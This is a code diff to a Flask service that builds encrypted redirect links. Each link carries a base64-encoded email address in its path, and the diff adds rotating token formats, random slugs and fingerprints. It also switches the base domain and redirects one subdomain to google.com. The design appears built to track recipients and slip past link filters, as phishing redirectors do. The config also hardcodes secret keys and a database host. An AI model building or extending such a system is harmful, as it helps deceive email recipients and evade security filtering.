@@ -2,6 +2,7 @@ from flask import Flask, request, redirect, render_template_string, abort, url_f
 from flask_wtf import FlaskForm, CSRFProtect
 from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
 from wtforms.validators import DataRequired, Length, Regexp, URL
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import hashes, hmac
 from cryptography.hazmat.backends import default_backend
 import os
@@ -36,6 +37,7 @@ logger.debug("Initializing Flask app")
 # Hardcoded configuration values (move to environment variables in production)
 FLASK_SECRET_KEY = "b8f9a3c2d7e4f1a9b0c3d6e8f2a7b4c9"
 WTF_CSRF_SECRET_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
+ENCRYPTION_KEY = secrets.token_bytes(32)
 HMAC_KEY = secrets.token_bytes(32)
 VALKEY_HOST = "valkey-137d99b9-reign.e.aivencloud.com"
 VALKEY_PORT = 25708
@@ -131,6 +133,22 @@ def datetime_filter(timestamp):
 
 app.jinja_env.filters['datetime'] = datetime_filter
 
+# Track encryption method rotation
+encryption_rotation = ['heap_x3', 'slugstorm', 'signed_token']
+encryption_index_key = "encryption_index"
+
+def get_next_encryption_method():
+    try:
+        if valkey_client:
+            index = int(valkey_client.get(encryption_index_key) or 0)
+            valkey_client.set(encryption_index_key, (index + 1) % len(encryption_rotation))
+            return encryption_rotation[index % len(encryption_rotation)]
+        else:
+            return secrets.choice(encryption_rotation)
+    except Exception as e:
+        logger.error(f"Error in get_next_encryption_method: {str(e)}")
+        return 'signed_token'
+
 def rate_limit(limit=5, per=60):
     def decorator(f):
         @wraps(f)
@@ -158,13 +176,103 @@ def rate_limit(limit=5, per=60):
         return wrapped_function
     return decorator
 
+def generate_fingerprint():
+    try:
+        ip = request.remote_addr
+        raw = f"{ip}{time.time()}{secrets.token_hex(8)}"
+        fingerprint = hashlib.sha256(raw.encode()).hexdigest()[:16]
+        logger.debug(f"Generated fingerprint: {fingerprint}...")
+        return fingerprint
+    except Exception as e:
+        logger.error(f"Error in generate_fingerprint: {str(e)}", exc_info=True)
+        return hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
+
+def encrypt_heap_x3(payload, fingerprint):
+    try:
+        iv = secrets.token_bytes(12)
+        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        data = json.dumps({"payload": payload, "fingerprint": fingerprint}).encode()
+        ciphertext = encryptor.update(data) + encryptor.finalize()
+        encrypted = iv + ciphertext + encryptor.tag
+        slug = f"{uuid.uuid4()}{secrets.token_hex(10)}"
+        result = f"{base64.urlsafe_b64encode(encrypted).decode()}.{slug}"
+        logger.debug(f"HEAP X3 encrypted payload: {result[:20]}...")
+        return result
+    except Exception as e:
+        logger.error(f"HEAP X3 encryption error: {str(e)}", exc_info=True)
+        raise ValueError("Encryption failed")
+
+def decrypt_heap_x3(encrypted):
+    try:
+        parts = encrypted.split('.')
+        if len(parts) < 1:
+            raise ValueError("Invalid payload format")
+        encrypted = base64.urlsafe_b64decode(parts[0])
+        iv = encrypted[:12]
+        tag = encrypted[-16:]
+        ciphertext = encrypted[12:-16]
+        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+        result = json.loads(decrypted.decode())
+        logger.debug(f"HEAP X3 decrypted payload: {json.dumps(result)[:50]}...")
+        return result
+    except Exception as e:
+        logger.error(f"HEAP X3 decryption error: {str(e)}", exc_info=True)
+        raise ValueError("Invalid payload")
+
+def encrypt_slugstorm(payload):
+    try:
+        expiry = (datetime.utcnow() + timedelta(hours=24)).timestamp() * 1000
+        data = json.dumps({"payload": payload, "expires": expiry})
+        uuid_chain = f"{uuid.uuid4()}{secrets.token_hex(10)}"
+        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
+        h.update(data.encode())
+        signature = h.finalize()
+        result = f"{base64.urlsafe_b64encode(data.encode()).decode()}.{uuid_chain}.{base64.urlsafe_b64encode(signature).decode()}"
+        logger.debug(f"SlugStorm encrypted payload: {result[:20]}...")
+        return result
+    except Exception as e:
+        logger.error(f"SlugStorm encryption error: {str(e)}", exc_info=True)
+        raise ValueError("Encryption failed")
+
+def decrypt_slugstorm(encrypted):
+    try:
+        parts = encrypted.split('.')
+        if len(parts) < 2:
+            logger.warning(f"SlugStorm: Expected at least 2 parts, got {len(parts)}")
+            raise ValueError("Invalid payload format")
+        data_b64 = parts[0]
+        sig_b64 = parts[-1]
+        try:
+            data = base64.urlsafe_b64decode(data_b64).decode('utf-8')
+        except UnicodeDecodeError as e:
+            logger.warning(f"UTF-8 decode failed: {str(e)}, trying latin1")
+            data = base64.urlsafe_b64decode(data_b64).decode('latin1', errors='ignore')
+        logger.debug(f"SlugStorm raw decoded data: {data[:50]}...")
+        signature = base64.urlsafe_b64decode(sig_b64)
+        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
+        h.update(data.encode('utf-8'))
+        h.verify(signature)
+        data = json.loads(data)
+        if data['expires'] < int(time.time() * 1000):
+            logger.warning("SlugStorm payload expired")
+            raise ValueError("Payload expired")
+        logger.debug(f"SlugStorm decrypted payload: {json.dumps(data)[:50]}...")
+        return data
+    except Exception as e:
+        logger.error(f"SlugStorm decryption error: {str(e)}", exc_info=True)
+        raise ValueError("Invalid payload")
+
 def encrypt_signed_token(payload):
     try:
         data = payload.encode()
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
         h.update(data)
         signature = h.finalize()
-        result = f"{base64.urlsafe_b64encode(data).decode()}.{base64.urlsafe_b64encode(signature).decode()}"
+        uuid_chain = f"{uuid.uuid4()}{secrets.token_hex(10)}"
+        result = f"{base64.urlsafe_b64encode(data).decode()}.{uuid_chain}.{base64.urlsafe_b64encode(signature).decode()}"
         logger.debug(f"Signed Token encrypted payload: {result[:20]}...")
         return result
     except Exception as e:
@@ -174,9 +282,9 @@ def encrypt_signed_token(payload):
 def decrypt_signed_token(encrypted):
     try:
         parts = encrypted.split('.')
-        if len(parts) != 2:
+        if len(parts) != 3:
             raise ValueError("Invalid signed token format")
-        data_b64, sig_b64 = parts
+        data_b64, _, sig_b64 = parts
         data = base64.urlsafe_b64decode(data_b64)
         signature = base64.urlsafe_b64decode(sig_b64)
         h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
@@ -234,12 +342,12 @@ def get_base_domain():
         return host
     except Exception as e:
         logger.error(f"Error getting base domain: {str(e)}")
-        return "nvclerks.com"
+        return "tamarisksd.com"
 
 @app.before_request
 def block_ohio_subdomain():
     try:
-        if request.host == 'ohioautocollection.nvclerks.com':
+        if request.host == 'ohioautocollection.tamarisksd.com':
             logger.debug(f"Redirecting request to {request.host} to https://google.com")
             return redirect("https://google.com", code=302)
     except Exception as e:
@@ -386,8 +494,10 @@ def dashboard():
                 logger.warning(f"Invalid destination_link: {destination_link}")
 
             if not error:
-                path_segment = f"{randomstring1}{base64email}{randomstring2}"
-                endpoint = generate_random_string(8)
+                path_segment = f"{randomstring1}{base64email}{randomstring2}/{uuid.uuid4()}{secrets.token_hex(10)}"
+                endpoint = generate_random_string(16)
+                encryption_method = get_next_encryption_method()
+                fingerprint = generate_fingerprint()
                 expiry_timestamp = int(time.time()) + expiry
                 payload = json.dumps({
                     "student_link": destination_link,
@@ -396,9 +506,14 @@ def dashboard():
                 })
 
                 try:
-                    encrypted_payload = encrypt_signed_token(payload)
+                    if encryption_method == 'heap_x3':
+                        encrypted_payload = encrypt_heap_x3(payload, fingerprint)
+                    elif encryption_method == 'slugstorm':
+                        encrypted_payload = encrypt_slugstorm(payload)
+                    else:
+                        encrypted_payload = encrypt_signed_token(payload)
                 except Exception as e:
-                    logger.error(f"Encryption failed: {str(e)}", exc_info=True)
+                    logger.error(f"Encryption failed with {encryption_method}: {str(e)}", exc_info=True)
                     error = "Failed to encrypt payload"
 
                 if not error:
@@ -411,13 +526,14 @@ def dashboard():
                                 "destination": destination_link,
                                 "encrypted_payload": encrypted_payload,
                                 "endpoint": endpoint,
+                                "encryption_method": encryption_method,
                                 "created": int(time.time()),
                                 "expiry": expiry_timestamp,
                                 "clicks": 0,
                                 "analytics_enabled": "1" if analytics_enabled else "0"
                             })
                             valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
-                            logger.info(f"Generated URL for {username}: {generated_url}, Analytics: {analytics_enabled}")
+                            logger.info(f"Generated URL for {username}: {generated_url}, Method: {encryption_method}, Analytics: {analytics_enabled}")
                         except Exception as e:
                             logger.error(f"Valkey error storing URL: {str(e)}", exc_info=True)
                             error = "Failed to store URL in database"
@@ -480,16 +596,12 @@ def dashboard():
                     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                     .card { transition: all 0.3s; box-shadow: 0 10px 15px rgba(0,0,0,0.1); }
                     .card:hover { transform: translateY(-5px); }
-                    .tab { cursor: pointer; transition: all 0.3s; }
-                    .tab.active { background-color: #4f46e5; color: white; }
                     .table-container { max-height: 400px; overflow-y: auto; }
                     table { width: 100%; border-collapse: collapse; }
                     th, td { padding: 12px; text-align: left; }
                     th { background: #e5e7eb; position: sticky; top: 0; }
                     tr:nth-child(even) { background: #f9fafb; }
                     .error { background: #fee2e2; color: #b91c1c; }
-                    .refresh-btn { animation: pulse 2s infinite; }
-                    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
                     .toggle-switch { position: relative; display: inline-block; width: 60px; height: 34px; }
                     .toggle-switch input { opacity: 0; width: 0; height: 0; }
                     .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
@@ -719,6 +831,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         if valkey_client:
             try:
                 analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
+                encryption_method = valkey_client.hget(f"user:{username}:url:{url_id}", "encryption_method")
                 if analytics_enabled:
                     valkey_client.hincrby(f"user:{username}:url:{url_id}", "clicks", 1)
                     logger.debug(f"Incremented clicks for URL ID: {url_id}")
@@ -743,36 +856,51 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 logger.error(f"Valkey error checking cached payload: {str(e)}", exc_info=True)
 
         if not payload:
-            try:
-                payload = decrypt_signed_token(encrypted_payload)
-                logger.debug(f"Decryption successful with signed_token")
-                if valkey_client:
-                    try:
-                        expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
-                        ttl = max(1, int(expiry - time.time()))
-                        valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
-                        logger.debug(f"Cached payload for URL ID: {url_id} with TTL {ttl}s")
-                    except Exception as e:
-                        logger.error(f"Valkey error caching payload: {str(e)}", exc_info=True)
-            except Exception as e:
-                logger.error(f"Decryption failed with signed_token: {str(e)}")
-                return render_template_string("""
-                    <!DOCTYPE html>
-                    <html lang="en">
-                    <head>
-                        <meta charset="UTF-8">
-                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                        <title>Invalid Link</title>
-                        <script src="https://cdn.tailwindcss.com"></script>
-                    </head>
-                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                            <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
-                            <p class="text-gray-600">The link is invalid or has expired. Please contact support.</p>
-                        </div>
-                    </body>
-                    </html>
-                """), 400
+            methods = [encryption_method] if encryption_method else ['heap_x3', 'slugstorm', 'signed_token']
+            for method in methods:
+                try:
+                    logger.debug(f"Trying decryption method: {method}")
+                    if method == 'heap_x3':
+                        data = decrypt_heap_x3(encrypted_payload)
+                        payload = data['payload']
+                    elif method == 'slugstorm':
+                        data = decrypt_slugstorm(encrypted_payload)
+                        payload = data['payload']
+                    else:
+                        payload = decrypt_signed_token(encrypted_payload)
+                    logger.debug(f"Decryption successful with {method}")
+                    if valkey_client:
+                        try:
+                            expiry = json.loads(payload).get('expiry', int(time.time()) + 86400)
+                            ttl = max(1, int(expiry - time.time()))
+                            valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
+                            logger.debug(f"Cached payload for URL ID: {url_id} with TTL {ttl}s")
+                        except Exception as e:
+                            logger.error(f"Valkey error caching payload: {str(e)}", exc_info=True)
+                    break
+                except Exception as e:
+                    logger.debug(f"Decryption failed with {method}: {str(e)}")
+                    continue
+
+        if not payload:
+            logger.error(f"All decryption methods failed for payload: {encrypted_payload[:50]}...")
+            return render_template_string("""
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Invalid Link</title>
+                    <script src="https://cdn.tailwindcss.com"></script>
+                </head>
+                <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
+                    <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
+                        <h3 class="text-lg font-bold mb-4 text-red-600">Invalid Link</h3>
+                        <p class="text-gray-600">The link is invalid or has expired. Please contact support.</p>
+                    </div>
+                </body>
+                </html>
+            """), 400
 
         try:
             data = json.loads(payload)
